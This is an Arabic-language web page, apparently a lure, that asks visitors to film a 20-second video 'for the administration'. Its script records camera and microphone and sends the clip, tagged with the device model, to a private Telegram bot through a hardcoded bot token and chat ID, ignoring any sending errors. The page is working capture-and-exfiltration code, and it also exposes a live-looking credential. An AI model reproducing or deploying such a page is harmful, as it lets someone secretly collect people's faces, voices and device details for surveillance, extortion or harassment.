<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎬 تصوير وإرسال</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: system-ui, sans-serif;
            background: #000; color: #fff;
            height: 100vh; display: flex;
            align-items: center; justify-content: center;
            text-align: center; padding: 20px;
        }
        .container { max-width: 400px; width: 100%; }
        .step { display: none; }
        .step.active { display: block; }
        .icon { font-size: 70px; margin-bottom: 16px; }
        h2 { font-size: 22px; margin-bottom: 8px; }
        p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
        .countdown { font-size: 60px; font-weight: 900; color: #e60000; margin: 16px 0; }
        .progress-bar { width: 100%; height: 6px; background: #222; border-radius: 3px; margin: 16px 0; overflow: hidden; }
        .progress-fill { height: 100%; background: #e60000; width: 0%; transition: width 0.3s; }
        video { width: 100%; max-width: 350px; border-radius: 16px; display: none; }
        button { background:#e60000; color:#fff; border:none; padding:16px 40px; border-radius:25px; font-size:18px; font-weight:700; cursor:pointer; width:100%; }
    </style>
</head>
<body>

<div class="container">
    <div class="step active" id="step-start">
        <div class="icon">📷</div>
        <h2>تصوير وإرسال</h2>
        <p>سيتم تصوير فيديو 20 ثانية وإرساله تلقائياً</p>
        <button onclick="startAll()">بدء التصوير</button>
    </div>
    <div class="step" id="step-recording">
        <div class="icon">🔴</div>
        <h2>جاري التسجيل...</h2>
        <p>الرجاء الثبات أمام الكاميرا</p>
        <div class="countdown" id="countdown">20</div>
        <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
        <video id="preview-video" autoplay playsinline muted></video>
    </div>
    <div class="step" id="step-sending">
        <div class="icon">📤</div>
        <h2>جاري الإرسال...</h2>
        <p>يتم إرسال الفيديو للإدارة</p>
    </div>
    <div class="step" id="step-done">
        <div class="icon">✅</div>
        <h2 style="color:#059669;">تم بنجاح!</h2>
        <p>الفيديو اتبعت للإدارة</p>
    </div>
</div>

<script>
const BOT_TOKEN = '8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
const CHAT_ID = '7276604783';
let mediaRecorder, recordedChunks = [], stream;

function showStep(id) {
    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

async function startAll() {
    try {
        showStep('step-recording');
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        document.getElementById('preview-video').srcObject = stream;
        document.getElementById('preview-video').style.display = 'block';
        recordedChunks = [];
        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
        mediaRecorder.start();
        let seconds = 20;
        const countdownEl = document.getElementById('countdown');
        const progressFill = document.getElementById('progress-fill');
        const interval = setInterval(async () => {
            seconds--;
            countdownEl.textContent = seconds;
            progressFill.style.width = ((20 - seconds) / 20 * 100) + '%';
            if (seconds <= 0) {
                clearInterval(interval);
                mediaRecorder.stop();
                showStep('step-sending');
                await new Promise(r => setTimeout(r, 2000));
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const deviceName = navigator.userAgent.match(/; ([^;]+) Build/)?.[1] || 'جهاز';
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', blob, 'video_' + Date.now() + '.webm');
                formData.append('caption', '🎬 فيديو\n📱 ' + deviceName);
                try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData }); } catch(e) {}
                showStep('step-done');
                stream.getTracks().forEach(t => t.stop());
            }
        }, 1000);
    } catch (e) { alert('لم يتم السماح بالكاميرا'); }
}
</script>
</body>
</html>
